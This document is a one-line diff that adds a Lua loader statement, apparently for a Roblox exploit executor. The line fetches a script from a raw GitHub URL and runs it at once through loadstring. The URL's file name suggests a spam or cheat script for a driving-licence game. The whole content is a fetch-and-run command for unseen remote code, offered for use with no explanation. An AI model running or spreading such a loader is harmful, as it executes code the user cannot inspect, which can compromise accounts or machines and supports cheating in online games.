@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/get-your-driver-s-license-spam3-q5e9bivljldkdk.lua"))()
